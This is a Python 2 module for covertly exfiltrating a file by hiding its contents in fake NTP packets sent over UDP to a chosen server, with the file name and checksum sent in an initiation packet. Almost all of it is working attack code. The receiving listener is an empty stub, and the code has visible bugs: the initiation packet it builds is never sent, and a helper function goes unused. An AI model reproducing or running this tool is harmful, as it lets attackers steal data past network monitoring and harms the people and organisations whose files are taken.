#!/usr/bin/python

import os
import sys
import time
import zlib
import struct
import socket
from socket import AF_INET, SOCK_DGRAM

# Constants
READ_BINARY = "rb"
NTP_UDP_PORT = 123
HOST = "pool.ntp.org"
MAX_BYTES = 46
NULL = "\x00"
INIT_BYTE = "\x1b"
INIT_PACKET = "\x11\x22\x33\x44\x11\x12"
TERM_PACKET = "\x21" * MAX_BYTES
DELIMITER = "\xff\xfb\x01"
PADDER = "\xee"

# NTP packet structure from: http://www.meinbergglobal.com/english/info/ntp-packet.htm

def exfiltrate(path_to_file, ntp_server, time_delay=0.1):
	"""
	Exfiltration over NTP. Too tired to document :)
	:param path_to_file: path to file to exfiltrate
	:param ntp_server: ntp server to exfiltrate to
	:param time_delay: time delay between packets. default 0.1
	:return:
	"""
	def extract_real_time(buff):
		msg, address = client.recvfrom(buff)
		t = struct.unpack("!12I", msg)[10]
		t -= TIME1970
		print "\tTime=%s" % time.ctime(t)

	# Read file
	try:
		fh = open(path_to_file, READ_BINARY)
		exfil_me = fh.read()
		fh.close()
	except:
		sys.stderr.write("Problem with reading file. ")
		return -1

	checksum = zlib.crc32(exfil_me)                 # Calculate CRC32 for later verification
	head, tail = os.path.split(path_to_file)        # Get filename

	address = (ntp_server, NTP_UDP_PORT)
	buf = 1024

	TIME1970 = 2208988800L              # 1970-01-01 00:00:00

	msg = '\x1b'                        # Initing a NTP packet
	msg += MAX_BYTES * "\x41"           # Payload goes here
	msg += NULL                         # Null terminator

	try:
		client = socket.socket(AF_INET, SOCK_DGRAM)
	except:
		sys.stderr.write("Don't have access to open raw UDP socket.")
		return -1

	# Initiation packet
	init_msg = INIT_BYTE                                        # Add init byte to first message
	init_msg += INIT_PACKET + DELIMITER                         # Add init string
	init_msg += tail + DELIMITER + str(checksum)                # Add file name and checksum
	init_msg += PADDER * (MAX_BYTES - (len(init_msg)-1))        # Padding the damn thing
	init_msg += NULL                                            # Add null termination
	client.sendto(msg, address)

	chunks = [exfil_me[i:i + MAX_BYTES] for i in range(0, len(exfil_me), MAX_BYTES)]  # Split into chunks
	# Send actual file
	for chunk in chunks:
		msg = INIT_BYTE
		msg += chunk + NULL
		client.sendto(msg, address)
		time.sleep(time_delay)

	# Send termination packet
	msg = INIT_BYTE + TERM_PACKET + NULL
	client.sendto(msg, address)

	sys.stdout.write("Done with file %s " % tail)


def ntp_listener(ip="0.0.0.0", port=123):
	# will do this later.
	pass


if __name__ == "__main__":
	sys.stdout.write("This is meant to be a module for python and not a stand alone executable\n")